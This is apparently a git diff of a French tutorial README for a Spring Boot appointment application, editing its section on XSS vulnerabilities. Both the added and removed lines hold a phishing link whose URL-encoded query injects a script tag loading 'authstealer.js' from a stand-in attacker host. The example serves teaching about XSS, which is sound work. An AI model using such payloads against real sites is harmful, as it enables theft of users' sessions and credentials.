@@ -57,5 +57,5 @@ Enfin, on crée le formulaire qui nous permet de modifier et ajouter des rdvs, o
 
 ## Problème de vulnérabilité XSS côté SpringBoot :
 
-Si on imagine un problème de pishing quelconque qui nous conduit à cliquer sur un lien frauduleux : [I'm an inline-style link](http://localhost:8080/rdvs?q=puppies%3Cscript%20src=%22http://mallorysevilsite.com/authstealer.js%22%3E%3C/script%3E)
-[I'm an inline-style link](https://www.google.com)
+Si on imagine un problème de pishing quelconque qui nous conduit à cliquer sur un lien frauduleux : [I'm an fraudulent link](http://localhost:8080/rdvs?q=puppies%3Cscript%20src=%22http://mallorysevilsite.com/authstealer.js%22%3E%3C/script%3E)
+
